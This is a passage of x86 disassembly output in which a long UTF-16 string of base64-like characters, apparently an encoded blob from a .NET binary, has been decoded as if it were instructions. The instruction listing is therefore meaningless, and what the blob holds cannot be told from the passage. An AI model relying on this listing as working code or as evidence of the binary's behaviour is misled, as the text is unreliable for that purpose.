  40ac3a:	43                   	inc    %ebx
  40ac3b:	00 53 00             	add    %dl,0x0(%ebx)
  40ac3e:	37                   	aaa
  40ac3f:	00 56 00             	add    %dl,0x0(%esi)
  40ac42:	4e                   	dec    %esi
  40ac43:	00 77 00             	add    %dh,0x0(%edi)
  40ac46:	4d                   	dec    %ebp
  40ac47:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac4a:	56                   	push   %esi
  40ac4b:	00 65 00             	add    %ah,0x0(%ebp)
  40ac4e:	63 00                	arpl   %eax,(%eax)
  40ac50:	75 00                	jne    0x40ac52
  40ac52:	73 00                	jae    0x40ac54
  40ac54:	61                   	popa
  40ac55:	00 31                	add    %dh,(%ecx)
  40ac57:	00 72 00             	add    %dh,0x0(%edx)
  40ac5a:	39 00                	cmp    %eax,(%eax)
  40ac5c:	45                   	inc    %ebp
  40ac5d:	00 00                	add    %al,(%eax)
  40ac5f:	87 b1 75 00 6e 00    	xchg   %esi,0x6e0075(%ecx)
  40ac65:	2f                   	das
  40ac66:	00 61 00             	add    %ah,0x0(%ecx)
  40ac69:	32 00                	xor    (%eax),%al
  40ac6b:	73 00                	jae    0x40ac6d
  40ac6d:	72 00                	jb     0x40ac6f
  40ac6f:	4a                   	dec    %edx
  40ac70:	00 77 00             	add    %dh,0x0(%edi)
  40ac73:	34 00                	xor    $0x0,%al
  40ac75:	55                   	push   %ebp
  40ac76:	00 71 00             	add    %dh,0x0(%ecx)
  40ac79:	5a                   	pop    %edx
  40ac7a:	00 42 00             	add    %al,0x0(%edx)
  40ac7d:	37                   	aaa
  40ac7e:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40ac82:	00 4f 00             	add    %cl,0x0(%edi)
  40ac85:	78 00                	js     0x40ac87
  40ac87:	32 00                	xor    (%eax),%al
  40ac89:	6c                   	insb   (%dx),%es:(%edi)
  40ac8a:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40ac8e:	00 6f 00             	add    %ch,0x0(%edi)
  40ac91:	69 00 6a 00 66 00    	imul   $0x66006a,(%eax),%eax
  40ac97:	4b                   	dec    %ebx
  40ac98:	00 43 00             	add    %al,0x0(%ebx)
  40ac9b:	31 00                	xor    %eax,(%eax)
  40ac9d:	54                   	push   %esp
  40ac9e:	00 58 00             	add    %bl,0x0(%eax)
  40aca1:	4d                   	dec    %ebp
  40aca2:	00 69 00             	add    %ch,0x0(%ecx)
  40aca5:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40aca9:	41                   	inc    %ecx
  40acaa:	00 65 00             	add    %ah,0x0(%ebp)
  40acad:	63 00                	arpl   %eax,(%eax)
  40acaf:	33 00                	xor    (%eax),%eax
  40acb1:	46                   	inc    %esi
  40acb2:	00 65 00             	add    %ah,0x0(%ebp)
  40acb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40acb6:	00 4e 00             	add    %cl,0x0(%esi)
  40acb9:	79 00                	jns    0x40acbb
  40acbb:	78 00                	js     0x40acbd
  40acbd:	51                   	push   %ecx
  40acbe:	00 49 00             	add    %cl,0x0(%ecx)
  40acc1:	63 00                	arpl   %eax,(%eax)
  40acc3:	46                   	inc    %esi
  40acc4:	00 7a 00             	add    %bh,0x0(%edx)
  40acc7:	32 00                	xor    (%eax),%al
  40acc9:	63 00                	arpl   %eax,(%eax)
  40accb:	33 00                	xor    (%eax),%eax
  40accd:	7a 00                	jp     0x40accf
  40accf:	57                   	push   %edi
  40acd0:	00 55 00             	add    %dl,0x0(%ebp)
  40acd3:	47                   	inc    %edi
  40acd4:	00 58 00             	add    %bl,0x0(%eax)
  40acd7:	4b                   	dec    %ebx
  40acd8:	00 43 00             	add    %al,0x0(%ebx)
  40acdb:	57                   	push   %edi
  40acdc:	00 6f 00             	add    %ch,0x0(%edi)
  40acdf:	71 00                	jno    0x40ace1
  40ace1:	6f                   	outsl  %ds:(%esi),(%dx)
  40ace2:	00 32                	add    %dh,(%edx)
  40ace4:	00 79 00             	add    %bh,0x0(%ecx)
  40ace7:	4b                   	dec    %ebx
  40ace8:	00 45 00             	add    %al,0x0(%ebp)
  40aceb:	33 00                	xor    (%eax),%eax
  40aced:	44                   	inc    %esp
  40acee:	00 67 00             	add    %ah,0x0(%edi)
  40acf1:	47                   	inc    %edi
  40acf2:	00 68 00             	add    %ch,0x0(%eax)
  40acf5:	61                   	popa
  40acf6:	00 78 00             	add    %bh,0x0(%eax)
  40acf9:	69 00 4a 00 34 00    	imul   $0x34004a,(%eax),%eax
  40acff:	59                   	pop    %ecx
  40ad00:	00 69 00             	add    %ch,0x0(%ecx)
  40ad03:	30 00                	xor    %al,(%eax)
  40ad05:	69 00 69 00 5a 00    	imul   $0x5a0069,(%eax),%eax
  40ad0b:	37                   	aaa
  40ad0c:	00 44 00 48          	add    %al,0x48(%eax,%eax,1)
  40ad10:	00 53 00             	add    %dl,0x0(%ebx)
  40ad13:	4f                   	dec    %edi
  40ad14:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad17:	72 00                	jb     0x40ad19
  40ad19:	37                   	aaa
  40ad1a:	00 38                	add    %bh,(%eax)
  40ad1c:	00 79 00             	add    %bh,0x0(%ecx)
  40ad1f:	6b 00 48             	imul   $0x48,(%eax),%eax
  40ad22:	00 51 00             	add    %dl,0x0(%ecx)
  40ad25:	55                   	push   %ebp
  40ad26:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40ad2a:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  40ad2e:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  40ad32:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40ad36:	00 32                	add    %dh,(%edx)
  40ad38:	00 51 00             	add    %dl,0x0(%ecx)
  40ad3b:	71 00                	jno    0x40ad3d
  40ad3d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad3e:	00 38                	add    %bh,(%eax)
  40ad40:	00 70 00             	add    %dh,0x0(%eax)
  40ad43:	4b                   	dec    %ebx
  40ad44:	00 55 00             	add    %dl,0x0(%ebp)
  40ad47:	31 00                	xor    %eax,(%eax)
  40ad49:	7a 00                	jp     0x40ad4b
  40ad4b:	57                   	push   %edi
  40ad4c:	00 37                	add    %dh,(%edi)
  40ad4e:	00 52 00             	add    %dl,0x0(%edx)
  40ad51:	67 00 74 00          	add    %dh,0x0(%si)
  40ad55:	77 00                	ja     0x40ad57
  40ad57:	35 00 6c 00 79       	xor    $0x79006c00,%eax
  40ad5c:	00 31                	add    %dh,(%ecx)
  40ad5e:	00 51 00             	add    %dl,0x0(%ecx)
  40ad61:	46                   	inc    %esi
  40ad62:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40ad66:	00 43 00             	add    %al,0x0(%ebx)
  40ad69:	76 00                	jbe    0x40ad6b
  40ad6b:	38 00                	cmp    %al,(%eax)
  40ad6d:	4e                   	dec    %esi
  40ad6e:	00 33                	add    %dh,(%ebx)
  40ad70:	00 39                	add    %bh,(%ecx)
  40ad72:	00 67 00             	add    %ah,0x0(%edi)
  40ad75:	41                   	inc    %ecx
  40ad76:	00 76 00             	add    %dh,0x0(%esi)
  40ad79:	4e                   	dec    %esi
  40ad7a:	00 48 00             	add    %cl,0x0(%eax)
  40ad7d:	55                   	push   %ebp
  40ad7e:	00 49 00             	add    %cl,0x0(%ecx)
  40ad81:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad82:	00 63 00             	add    %ah,0x0(%ebx)
  40ad85:	57                   	push   %edi
  40ad86:	00 75 00             	add    %dh,0x0(%ebp)
  40ad89:	6c                   	insb   (%dx),%es:(%edi)
  40ad8a:	00 72 00             	add    %dh,0x0(%edx)
  40ad8d:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40ad91:	59                   	pop    %ecx
  40ad92:	00 71 00             	add    %dh,0x0(%ecx)
  40ad95:	6c                   	insb   (%dx),%es:(%edi)
  40ad96:	00 4f 00             	add    %cl,0x0(%edi)
  40ad99:	46                   	inc    %esi
  40ad9a:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad9d:	4a                   	dec    %edx
  40ad9e:	00 72 00             	add    %dh,0x0(%edx)
  40ada1:	37                   	aaa
  40ada2:	00 44 00 52          	add    %al,0x52(%eax,%eax,1)
  40ada6:	00 48 00             	add    %cl,0x0(%eax)
  40ada9:	52                   	push   %edx
  40adaa:	00 39                	add    %bh,(%ecx)
  40adac:	00 4e 00             	add    %cl,0x0(%esi)
  40adaf:	4c                   	dec    %esp
  40adb0:	00 4b 00             	add    %cl,0x0(%ebx)
  40adb3:	52                   	push   %edx
  40adb4:	00 66 00             	add    %ah,0x0(%esi)
  40adb7:	42                   	inc    %edx
  40adb8:	00 39                	add    %bh,(%ecx)
  40adba:	00 35 00 72 00 78    	add    %dh,0x78007200
  40adc0:	00 2f                	add    %ch,(%edi)
  40adc2:	00 6a 00             	add    %ch,0x0(%edx)
  40adc5:	39 00                	cmp    %eax,(%eax)
  40adc7:	71 00                	jno    0x40adc9
  40adc9:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40adcd:	4d                   	dec    %ebp
  40adce:	00 43 00             	add    %al,0x0(%ebx)
  40add1:	56                   	push   %esi
  40add2:	00 6e 00             	add    %ch,0x0(%esi)
  40add5:	43                   	inc    %ebx
  40add6:	00 73 00             	add    %dh,0x0(%ebx)
  40add9:	43                   	inc    %ebx
  40adda:	00 32                	add    %dh,(%edx)
  40addc:	00 45 00             	add    %al,0x0(%ebp)
  40addf:	46                   	inc    %esi
  40ade0:	00 49 00             	add    %cl,0x0(%ecx)
  40ade3:	71 00                	jno    0x40ade5
  40ade5:	59                   	pop    %ecx
  40ade6:	00 70 00             	add    %dh,0x0(%eax)
  40ade9:	42                   	inc    %edx
  40adea:	00 37                	add    %dh,(%edi)
  40adec:	00 48 00             	add    %cl,0x0(%eax)
  40adef:	4e                   	dec    %esi
  40adf0:	00 53 00             	add    %dl,0x0(%ebx)
  40adf3:	56                   	push   %esi
  40adf4:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40adf8:	00 55 00             	add    %dl,0x0(%ebp)
  40adfb:	6d                   	insl   (%dx),%es:(%edi)
  40adfc:	00 2b                	add    %ch,(%ebx)
  40adfe:	00 4e 00             	add    %cl,0x0(%esi)
  40ae01:	56                   	push   %esi
  40ae02:	00 49 00             	add    %cl,0x0(%ecx)
  40ae05:	33 00                	xor    (%eax),%eax
  40ae07:	6d                   	insl   (%dx),%es:(%edi)
  40ae08:	00 66 00             	add    %ah,0x0(%esi)
  40ae0b:	35 00 61 00 6b       	xor    $0x6b006100,%eax
  40ae10:	00 73 00             	add    %dh,0x0(%ebx)
  40ae13:	43                   	inc    %ebx
  40ae14:	00 51 00             	add    %dl,0x0(%ecx)
  40ae17:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae18:	00 57 00             	add    %dl,0x0(%edi)
  40ae1b:	31 00                	xor    %eax,(%eax)
  40ae1d:	44                   	inc    %esp
  40ae1e:	00 4c 00 56          	add    %cl,0x56(%eax,%eax,1)
  40ae22:	00 73 00             	add    %dh,0x0(%ebx)
  40ae25:	75 00                	jne    0x40ae27
  40ae27:	71 00                	jno    0x40ae29
  40ae29:	45                   	inc    %ebp
  40ae2a:	00 47 00             	add    %al,0x0(%edi)
  40ae2d:	57                   	push   %edi
  40ae2e:	00 55 00             	add    %dl,0x0(%ebp)
  40ae31:	42                   	inc    %edx
  40ae32:	00 55 00             	add    %dl,0x0(%ebp)
  40ae35:	38 00                	cmp    %al,(%eax)
  40ae37:	2f                   	das
  40ae38:	00 35 00 77 00 62    	add    %dh,0x62007700
  40ae3e:	00 39                	add    %bh,(%ecx)
  40ae40:	00 30                	add    %dh,(%eax)
  40ae42:	00 71 00             	add    %dh,0x0(%ecx)
  40ae45:	36 00 2f             	add    %ch,%ss:(%edi)
  40ae48:	00 56 00             	add    %dl,0x0(%esi)
  40ae4b:	7a 00                	jp     0x40ae4d
  40ae4d:	50                   	push   %eax
  40ae4e:	00 69 00             	add    %ch,0x0(%ecx)
  40ae51:	33 00                	xor    (%eax),%eax
  40ae53:	59                   	pop    %ecx
  40ae54:	00 6e 00             	add    %ch,0x0(%esi)
  40ae57:	63 00                	arpl   %eax,(%eax)
  40ae59:	4d                   	dec    %ebp
  40ae5a:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae5d:	56                   	push   %esi
  40ae5e:	00 4f 00             	add    %cl,0x0(%edi)
  40ae61:	30 00                	xor    %al,(%eax)
  40ae63:	37                   	aaa
  40ae64:	00 75 00             	add    %dh,0x0(%ebp)
  40ae67:	33 00                	xor    (%eax),%eax
  40ae69:	45                   	inc    %ebp
  40ae6a:	00 39                	add    %bh,(%ecx)
  40ae6c:	00 66 00             	add    %ah,0x0(%esi)
  40ae6f:	62 00                	bound  %eax,(%eax)
  40ae71:	77 00                	ja     0x40ae73
  40ae73:	53                   	push   %ebx
  40ae74:	00 2b                	add    %ch,(%ebx)
  40ae76:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40ae7a:	00 2f                	add    %ch,(%edi)
  40ae7c:	00 2f                	add    %ch,(%edi)
  40ae7e:	00 33                	add    %dh,(%ebx)
  40ae80:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40ae84:	00 73 00             	add    %dh,0x0(%ebx)
  40ae87:	46                   	inc    %esi
  40ae88:	00 48 00             	add    %cl,0x0(%eax)
  40ae8b:	50                   	push   %eax
  40ae8c:	00 2f                	add    %ch,(%edi)
  40ae8e:	00 73 00             	add    %dh,0x0(%ebx)
  40ae91:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae92:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40ae96:	00 52 00             	add    %dl,0x0(%edx)
  40ae99:	6b 00 2b             	imul   $0x2b,(%eax),%eax
  40ae9c:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40aea0:	00 30                	add    %dh,(%eax)
  40aea2:	00 67 00             	add    %ah,0x0(%edi)
  40aea5:	76 00                	jbe    0x40aea7
  40aea7:	70 00                	jo     0x40aea9
  40aea9:	7a 00                	jp     0x40aeab
  40aeab:	4d                   	dec    %ebp
  40aeac:	00 79 00             	add    %bh,0x0(%ecx)
  40aeaf:	62 00                	bound  %eax,(%eax)
  40aeb1:	6e                   	outsb  %ds:(%esi),(%dx)
  40aeb2:	00 51 00             	add    %dl,0x0(%ecx)
  40aeb5:	62 00                	bound  %eax,(%eax)
  40aeb7:	46                   	inc    %esi
  40aeb8:	00 59 00             	add    %bl,0x0(%ecx)
  40aebb:	63 00                	arpl   %eax,(%eax)
  40aebd:	4d                   	dec    %ebp
  40aebe:	00 76 00             	add    %dh,0x0(%esi)
  40aec1:	5a                   	pop    %edx
  40aec2:	00 72 00             	add    %dh,0x0(%edx)
  40aec5:	32 00                	xor    (%eax),%al
  40aec7:	31 00                	xor    %eax,(%eax)
  40aec9:	56                   	push   %esi
  40aeca:	00 63 00             	add    %ah,0x0(%ebx)
  40aecd:	70 00                	jo     0x40aecf
  40aecf:	53                   	push   %ebx
  40aed0:	00 6a 00             	add    %ch,0x0(%edx)
  40aed3:	52                   	push   %edx
  40aed4:	00 32                	add    %dh,(%edx)
  40aed6:	00 32                	add    %dh,(%edx)
  40aed8:	00 38                	add    %bh,(%eax)
  40aeda:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aedd:	4a                   	dec    %edx
  40aede:	00 65 00             	add    %ah,0x0(%ebp)
  40aee1:	37                   	aaa
  40aee2:	00 4f 00             	add    %cl,0x0(%edi)
  40aee5:	79 00                	jns    0x40aee7
  40aee7:	63 00                	arpl   %eax,(%eax)
  40aee9:	4f                   	dec    %edi
  40aeea:	00 63 00             	add    %ah,0x0(%ebx)
  40aeed:	4f                   	dec    %edi
  40aeee:	00 4d 00             	add    %cl,0x0(%ebp)
  40aef1:	49                   	dec    %ecx
  40aef2:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40aef6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aef9:	42                   	inc    %edx
  40aefa:	00 68 00             	add    %ch,0x0(%eax)
  40aefd:	72 00                	jb     0x40aeff
  40aeff:	71 00                	jno    0x40af01
  40af01:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40af04:	00 73 00             	add    %dh,0x0(%ebx)
  40af07:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40af0b:	31 00                	xor    %eax,(%eax)
  40af0d:	51                   	push   %ecx
  40af0e:	00 56 00             	add    %dl,0x0(%esi)
  40af11:	30 00                	xor    %al,(%eax)
  40af13:	76 00                	jbe    0x40af15
  40af15:	78 00                	js     0x40af17
  40af17:	7a 00                	jp     0x40af19
  40af19:	68 00 31 00 4c       	push   $0x4c003100
  40af1e:	00 30                	add    %dh,(%eax)
  40af20:	00 4e 00             	add    %cl,0x0(%esi)
  40af23:	70 00                	jo     0x40af25
  40af25:	4c                   	dec    %esp
  40af26:	00 4e 00             	add    %cl,0x0(%esi)
  40af29:	73 00                	jae    0x40af2b
  40af2b:	74 00                	je     0x40af2d
  40af2d:	34 00                	xor    $0x0,%al
  40af2f:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40af33:	55                   	push   %ebp
  40af34:	00 4e 00             	add    %cl,0x0(%esi)
  40af37:	46                   	inc    %esi
  40af38:	00 55 00             	add    %dl,0x0(%ebp)
  40af3b:	74 00                	je     0x40af3d
  40af3d:	41                   	inc    %ecx
  40af3e:	00 48 00             	add    %cl,0x0(%eax)
  40af41:	57                   	push   %edi
  40af42:	00 79 00             	add    %bh,0x0(%ecx)
  40af45:	59                   	pop    %ecx
  40af46:	00 72 00             	add    %dh,0x0(%edx)
  40af49:	50                   	push   %eax
  40af4a:	00 61 00             	add    %ah,0x0(%ecx)
  40af4d:	4b                   	dec    %ebx
  40af4e:	00 39                	add    %bh,(%ecx)
  40af50:	00 2f                	add    %ch,(%edi)
  40af52:	00 77 00             	add    %dh,0x0(%edi)
  40af55:	69 00 4f 00 32 00    	imul   $0x32004f,(%eax),%eax
  40af5b:	61                   	popa
  40af5c:	00 2f                	add    %ch,(%edi)
  40af5e:	00 4f 00             	add    %cl,0x0(%edi)
  40af61:	45                   	inc    %ebp
  40af62:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40af66:	00 76 00             	add    %dh,0x0(%esi)
  40af69:	66 00 54 00 63       	data16 add %dl,0x63(%eax,%eax,1)
  40af6e:	00 52 00             	add    %dl,0x0(%edx)
  40af71:	52                   	push   %edx
  40af72:	00 5a 00             	add    %bl,0x0(%edx)
  40af75:	6a 00                	push   $0x0
  40af77:	6b 00 77             	imul   $0x77,(%eax),%eax
  40af7a:	00 42 00             	add    %al,0x0(%edx)
  40af7d:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40af81:	64 00 36             	add    %dh,%fs:(%esi)
  40af84:	00 37                	add    %dh,(%edi)
  40af86:	00 33                	add    %dh,(%ebx)
  40af88:	00 71 00             	add    %dh,0x0(%ecx)
  40af8b:	75 00                	jne    0x40af8d
  40af8d:	59                   	pop    %ecx
  40af8e:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40af92:	00 52 00             	add    %dl,0x0(%edx)
  40af95:	55                   	push   %ebp
  40af96:	00 61 00             	add    %ah,0x0(%ecx)
  40af99:	41                   	inc    %ecx
  40af9a:	00 30                	add    %dh,(%eax)
  40af9c:	00 32                	add    %dh,(%edx)
  40af9e:	00 7a 00             	add    %bh,0x0(%edx)
  40afa1:	32 00                	xor    (%eax),%al
  40afa3:	73 00                	jae    0x40afa5
  40afa5:	78 00                	js     0x40afa7
  40afa7:	6d                   	insl   (%dx),%es:(%edi)
  40afa8:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40afac:	00 69 00             	add    %ch,0x0(%ecx)
  40afaf:	6e                   	outsb  %ds:(%esi),(%dx)
  40afb0:	00 48 00             	add    %cl,0x0(%eax)
  40afb3:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40afb7:	4e                   	dec    %esi
  40afb8:	00 59 00             	add    %bl,0x0(%ecx)
  40afbb:	67 00 6c 00          	add    %ch,0x0(%si)
  40afbf:	4f                   	dec    %edi
  40afc0:	00 53 00             	add    %dl,0x0(%ebx)
  40afc3:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40afc7:	4c                   	dec    %esp
  40afc8:	00 52 00             	add    %dl,0x0(%edx)
  40afcb:	78 00                	js     0x40afcd
  40afcd:	41                   	inc    %ecx
  40afce:	00 4a 00             	add    %cl,0x0(%edx)
  40afd1:	48                   	dec    %eax
  40afd2:	00 32                	add    %dh,(%edx)
  40afd4:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40afd8:	00 70 00             	add    %dh,0x0(%eax)
  40afdb:	63 00                	arpl   %eax,(%eax)
  40afdd:	74 00                	je     0x40afdf
  40afdf:	4b                   	dec    %ebx
  40afe0:	00 6e 00             	add    %ch,0x0(%esi)
  40afe3:	44                   	inc    %esp
  40afe4:	00 36                	add    %dh,(%esi)
  40afe6:	00 6e 00             	add    %ch,0x0(%esi)
  40afe9:	37                   	aaa
  40afea:	00 6f 00             	add    %ch,0x0(%edi)
  40afed:	73 00                	jae    0x40afef
  40afef:	55                   	push   %ebp
  40aff0:	00 70 00             	add    %dh,0x0(%eax)
  40aff3:	76 00                	jbe    0x40aff5
  40aff5:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40aff9:	4b                   	dec    %ebx
  40affa:	00 71 00             	add    %dh,0x0(%ecx)
  40affd:	7a 00                	jp     0x40afff
  40afff:	5a                   	pop    %edx
  40b000:	00 69 00             	add    %ch,0x0(%ecx)
  40b003:	70 00                	jo     0x40b005
  40b005:	38 00                	cmp    %al,(%eax)
  40b007:	6e                   	outsb  %ds:(%esi),(%dx)
  40b008:	00 4d 00             	add    %cl,0x0(%ebp)
  40b00b:	50                   	push   %eax
  40b00c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b00f:	76 00                	jbe    0x40b011
  40b011:	36 00 44 00 5a       	add    %al,%ss:0x5a(%eax,%eax,1)
  40b016:	00 59 00             	add    %bl,0x0(%ecx)
  40b019:	44                   	inc    %esp
  40b01a:	00 56 00             	add    %dl,0x0(%esi)
  40b01d:	2b 00                	sub    (%eax),%eax
  40b01f:	69 00 71 00 2b 00    	imul   $0x2b0071,(%eax),%eax
  40b025:	78 00                	js     0x40b027
  40b027:	43                   	inc    %ebx
  40b028:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  40b02c:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40b030:	00 7a 00             	add    %bh,0x0(%edx)
  40b033:	45                   	inc    %ebp
  40b034:	00 32                	add    %dh,(%edx)
  40b036:	00 56 00             	add    %dl,0x0(%esi)
  40b039:	34 00                	xor    $0x0,%al
  40b03b:	33 00                	xor    (%eax),%eax
  40b03d:	6a 00                	push   $0x0
  40b03f:	78 00                	js     0x40b041
  40b041:	67 00 4c 00          	add    %cl,0x0(%si)
  40b045:	44                   	inc    %esp
  40b046:	00 52 00             	add    %dl,0x0(%edx)
  40b049:	6f                   	outsl  %ds:(%esi),(%dx)
  40b04a:	00 48 00             	add    %cl,0x0(%eax)
  40b04d:	57                   	push   %edi
  40b04e:	00 75 00             	add    %dh,0x0(%ebp)
  40b051:	55                   	push   %ebp
  40b052:	00 2b                	add    %ch,(%ebx)
  40b054:	00 69 00             	add    %ch,0x0(%ecx)
  40b057:	69 00 4b 00 79 00    	imul   $0x79004b,(%eax),%eax
  40b05d:	38 00                	cmp    %al,(%eax)
  40b05f:	4e                   	dec    %esi
  40b060:	00 62 00             	add    %ah,0x0(%edx)
  40b063:	50                   	push   %eax
  40b064:	00 51 00             	add    %dl,0x0(%ecx)
  40b067:	39 00                	cmp    %eax,(%eax)
  40b069:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40b06d:	32 00                	xor    (%eax),%al
  40b06f:	35 00 39 00 6c       	xor    $0x6c003900,%eax
  40b074:	00 45 00             	add    %al,0x0(%ebp)
  40b077:	76 00                	jbe    0x40b079
  40b079:	57                   	push   %edi
  40b07a:	00 55 00             	add    %dl,0x0(%ebp)
  40b07d:	63 00                	arpl   %eax,(%eax)
  40b07f:	51                   	push   %ecx
  40b080:	00 2b                	add    %ch,(%ebx)
  40b082:	00 5a 00             	add    %bl,0x0(%edx)
  40b085:	69 00 56 00 65 00    	imul   $0x650056,(%eax),%eax
  40b08b:	33 00                	xor    (%eax),%eax
  40b08d:	69 00 6f 00 66 00    	imul   $0x66006f,(%eax),%eax
  40b093:	75 00                	jne    0x40b095
  40b095:	54                   	push   %esp
  40b096:	00 7a 00             	add    %bh,0x0(%edx)
  40b099:	61                   	popa
  40b09a:	00 36                	add    %dh,(%esi)
  40b09c:	00 68 00             	add    %ch,0x0(%eax)
  40b09f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0a0:	00 4d 00             	add    %cl,0x0(%ebp)
  40b0a3:	39 00                	cmp    %eax,(%eax)
  40b0a5:	70 00                	jo     0x40b0a7
  40b0a7:	32 00                	xor    (%eax),%al
  40b0a9:	49                   	dec    %ecx
  40b0aa:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0ad:	58                   	pop    %eax
  40b0ae:	00 39                	add    %bh,(%ecx)
  40b0b0:	00 58 00             	add    %bl,0x0(%eax)
  40b0b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0b4:	00 47 00             	add    %al,0x0(%edi)
  40b0b7:	54                   	push   %esp
  40b0b8:	00 50 00             	add    %dl,0x0(%eax)
  40b0bb:	71 00                	jno    0x40b0bd
  40b0bd:	34 00                	xor    $0x0,%al
  40b0bf:	78 00                	js     0x40b0c1
  40b0c1:	34 00                	xor    $0x0,%al
  40b0c3:	79 00                	jns    0x40b0c5
  40b0c5:	7a 00                	jp     0x40b0c7
  40b0c7:	72 00                	jb     0x40b0c9
  40b0c9:	6d                   	insl   (%dx),%es:(%edi)
  40b0ca:	00 78 00             	add    %bh,0x0(%eax)
  40b0cd:	47                   	inc    %edi
  40b0ce:	00 78 00             	add    %bh,0x0(%eax)
  40b0d1:	68 00 51 00 4f       	push   $0x4f005100
  40b0d6:	00 4a 00             	add    %cl,0x0(%edx)
  40b0d9:	50                   	push   %eax
  40b0da:	00 62 00             	add    %ah,0x0(%edx)
  40b0dd:	39 00                	cmp    %eax,(%eax)
  40b0df:	2f                   	das
  40b0e0:	00 58 00             	add    %bl,0x0(%eax)
  40b0e3:	35 00 55 00 7a       	xor    $0x7a005500,%eax
  40b0e8:	00 59 00             	add    %bl,0x0(%ecx)
  40b0eb:	4c                   	dec    %esp
  40b0ec:	00 4f 00             	add    %cl,0x0(%edi)
  40b0ef:	45                   	inc    %ebp
  40b0f0:	00 46 00             	add    %al,0x0(%esi)
  40b0f3:	76 00                	jbe    0x40b0f5
  40b0f5:	36 00 37             	add    %dh,%ss:(%edi)
  40b0f8:	00 35 00 6a 00 41    	add    %dh,0x41006a00
  40b0fe:	00 78 00             	add    %bh,0x0(%eax)
  40b101:	54                   	push   %esp
  40b102:	00 4b 00             	add    %cl,0x0(%ebx)
  40b105:	44                   	inc    %esp
  40b106:	00 68 00             	add    %ch,0x0(%eax)
  40b109:	32 00                	xor    (%eax),%al
  40b10b:	2b 00                	sub    (%eax),%eax
  40b10d:	52                   	push   %edx
  40b10e:	00 36                	add    %dh,(%esi)
  40b110:	00 38                	add    %bh,(%eax)
  40b112:	00 39                	add    %bh,(%ecx)
  40b114:	00 48 00             	add    %cl,0x0(%eax)
  40b117:	71 00                	jno    0x40b119
  40b119:	4f                   	dec    %edi
  40b11a:	00 47 00             	add    %al,0x0(%edi)
  40b11d:	75 00                	jne    0x40b11f
  40b11f:	45                   	inc    %ebp
  40b120:	00 58 00             	add    %bl,0x0(%eax)
  40b123:	4c                   	dec    %esp
  40b124:	00 44 00 77          	add    %al,0x77(%eax,%eax,1)
  40b128:	00 33                	add    %dh,(%ebx)
  40b12a:	00 67 00             	add    %ah,0x0(%edi)
  40b12d:	39 00                	cmp    %eax,(%eax)
  40b12f:	57                   	push   %edi
  40b130:	00 4d 00             	add    %cl,0x0(%ebp)
  40b133:	4b                   	dec    %ebx
  40b134:	00 32                	add    %dh,(%edx)
  40b136:	00 5a 00             	add    %bl,0x0(%edx)
  40b139:	6f                   	outsl  %ds:(%esi),(%dx)
  40b13a:	00 35 00 64 00 4a    	add    %dh,0x4a006400
  40b140:	00 6e 00             	add    %ch,0x0(%esi)
  40b143:	4b                   	dec    %ebx
  40b144:	00 76 00             	add    %dh,0x0(%esi)
  40b147:	53                   	push   %ebx
  40b148:	00 72 00             	add    %dh,0x0(%edx)
  40b14b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b14c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b14f:	46                   	inc    %esi
  40b150:	00 73 00             	add    %dh,0x0(%ebx)
  40b153:	53                   	push   %ebx
  40b154:	00 77 00             	add    %dh,0x0(%edi)
  40b157:	6f                   	outsl  %ds:(%esi),(%dx)
  40b158:	00 69 00             	add    %ch,0x0(%ecx)
  40b15b:	39 00                	cmp    %eax,(%eax)
  40b15d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b15e:	00 71 00             	add    %dh,0x0(%ecx)
  40b161:	6e                   	outsb  %ds:(%esi),(%dx)
  40b162:	00 58 00             	add    %bl,0x0(%eax)
  40b165:	73 00                	jae    0x40b167
  40b167:	7a 00                	jp     0x40b169
  40b169:	4e                   	dec    %esi
  40b16a:	00 38                	add    %bh,(%eax)
  40b16c:	00 76 00             	add    %dh,0x0(%esi)
  40b16f:	2b 00                	sub    (%eax),%eax
